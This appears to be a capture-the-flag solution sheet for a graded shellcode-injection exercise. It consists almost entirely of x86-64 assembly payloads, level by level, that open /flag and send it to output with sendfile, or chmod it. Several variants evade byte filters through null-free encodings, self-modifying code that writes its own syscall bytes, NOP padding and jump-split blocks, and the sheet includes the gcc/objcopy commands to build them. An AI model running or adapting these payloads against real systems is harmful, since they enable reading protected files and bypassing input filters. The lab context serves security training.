gcc -nostdlib -static shellcode.s -o shellcode-elf
objcopy --dump-section .text=shellcode-raw shellcode-elf

.level1
asm of sendline(1,open("/flag",0),0,1000)
//open(flag)
mov rbx,0x00000067616c662f
push rbx
mov rax,2
mov rdi,rsp
mov rsi,0
syscall

mov rdi,1
mov rsi,rax
mov rdx,0
mov r10,1000
mov rax,40
syscall

mov rax,60
syscall

.level3
//sendline(1,open("/flag",0),0,1000)
push 0x616c662f
mov BYTE PTR [rsp+4],0x67
xor rax,rax
inc rax
inc rax
mov rdi,rsp
xor rsi,rsi
syscall
xor rdi,rdi
inc rdi
mov rsi,rax
xor rdx,rdx
push 60
pop r10
push 40
pop rax
syscall

.level4
//
push 0x616c662f
mov BYTE PTR [rsp+4],0x67
mov eax,2
push rsp
pop rdi
xor esi,esi
syscall

mov edi,1
push rax
pop rsi
xor edx,edx
mov r10,1000
push 40
pop rax
syscall

.level5
//
xor rax,rax
A:
nop
nop
cmp rax,3
jz B
jg C
mov rbx,0x00000067616c662f
push rbx
add rax,0x500
add rax,0xf
mov rbx,0x237f3003
mov WORD PTR [rbx],ax
mov rax,2
mov rdi,rsp
mov rsi,0
jmp A
B:
mov rdi,1
mov rsi,rax
mov rdx,0
mov r10,1000
mov rax,40
jmp A
C:
nop

.level6
//
shellcode='''
xor rax,rax
A:
nop
nop
cmp rax,3
jz B
jg C
mov rbx,0x00000067616c662f
push rbx
add rax,0x500
add rax,0xf
mov rbx,0x13cb7012
mov WORD PTR [rbx],ax
mov rax,2
mov rdi,rsp
mov rsi,0
jmp A
B:
mov rdi,1
mov rsi,rax
mov rdx,0
mov r10,1000
mov rax,40
jmp A
C:
nop
'''
payload = asm(shellcode, arch='amd64').rjust(0x1070,b'\x90')

.level9
//
push 0x616c662f
jmp A
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
A:
mov BYTE PTR [rsp+4],0x67
jmp B
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
B:
inc eax
inc eax
push rsp
pop rdi
xor esi,esi
jmp C
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
C:
syscall

mov edi,1
jmp D
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
D:
push rax
pop rsi
xor edx,edx
xor r10,r10
jmp E
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
nop
E:
add r10,100
push 40
pop rax
syscall

.level12
//
push 0x616c662f
mov BYTE PTR [rsp+4],0x67
mov rdi,rsp
xor esi,esi
mov esi,0x123407ff
push 90
pop rax
syscall

